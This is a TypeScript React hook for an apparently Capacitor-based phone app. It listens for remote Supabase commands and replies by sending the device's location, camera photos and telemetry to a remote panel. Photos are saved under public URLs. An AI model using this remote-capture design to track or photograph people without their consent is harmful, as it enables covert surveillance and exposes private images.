import { useEffect } from 'react';
import { supabase, isSupabaseConfigured } from '@/lib/supabase';
import { addLog } from '@/lib/offline-cache';
import { getDeviceId } from '@/lib/device-id';
import { collectTelemetry } from '@/lib/telemetry';
import { toast } from '@/hooks/use-toast';
import { ObjectCamera, AudioRecorder } from '@/utils/DeviceModules';
import { CameraSource } from '@capacitor/camera';
import { Device } from '@capacitor/device';

export function useSupabaseCommands() {
  useEffect(() => {
    if (!isSupabaseConfigured() || !supabase) return;

    const deviceId = getDeviceId();

    const channel = supabase
      .channel('commands-listener')
      .on(
        'postgres_changes',
        { event: 'INSERT', schema: 'public', table: 'commands' },
        async (payload) => {
          const command = payload.new;
          const action = command.action as string;
          // O e-mail registrado é a nossa chave de conexão imutável (sempre lowercase)
          const registeredEmail = localStorage.getItem('ssa_permanent_email')?.toLowerCase().trim();

          // Se não houver ninguém registrado ainda, ignoramos qualquer comando
          if (!registeredEmail) return;

          // Só executa se o comando for destinado exatamente a este e-mail registrado
          const target = command.target_email as string;
          if (target && target.toLowerCase().trim() !== registeredEmail) {
            console.log('Comando ignorado: para outro destinatário:', target);
            return;
          }

          toast({
            title: 'Comando recebido',
            description: `Ação: ${action}`,
          });

          if (action === 'update_location' || action === 'fetch_location') {
            try {
              const pos = await new Promise<GeolocationPosition>((resolve, reject) =>
                navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 })
              );
              // Formatado exatamente como o Painel exige
              addLog({
                type: 'location_update',
                device_id: deviceId,
                payload: {
                  latitude: pos.coords.latitude,
                  longitude: pos.coords.longitude
                },
              });
            } catch {
              addLog({
                type: 'location_error',
                device_id: deviceId,
                payload: { error: 'Geolocation unavailable' }
              });
            }
          } else if (action === 'camera_front' || action === 'camera_back' || action === 'capture_photo' || action === 'start_screen_mirror') {
            try {
              toast({ title: 'Capturando...', description: 'Enviando imagem para o painel.' });
              const photoData = await ObjectCamera.capturePhoto(CameraSource.Camera);

              if (photoData) {
                // Upload para o Storage (exigência do Painel)
                const res = await fetch(photoData);
                const blob = await res.blob();
                const fileName = `capture-${Date.now()}.jpg`;

                const { data, error: uploadError } = await supabase.storage
                  .from('screenshots')
                  .upload(fileName, blob);

                if (!uploadError && data) {
                  const { data: { publicUrl } } = supabase.storage
                    .from('screenshots')
                    .getPublicUrl(fileName);

                  // O Painel lê 'screen_capture' e 'screenshot_url'
                  await addLog({
                    type: 'screen_capture',
                    device_id: deviceId,
                    payload: {
                      screenshot_url: publicUrl,
                      source: action
                    }
                  });
                }
              }
            } catch (err) {
              console.error('Falha na captura/storage:', err);
            }
          } else if (action === 'record_audio' || action === 'microphone' || action === 'system_diagnostic') {
            const telemetry = await collectTelemetry();
            const battery = await Device.getBatteryInfo();

            await addLog({
              type: 'status_update',
              device_id: deviceId,
              payload: {
                battery_level: battery.batteryLevel,
                status_text: "Monitorando",
                telemetry: telemetry
              }
            });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);
}
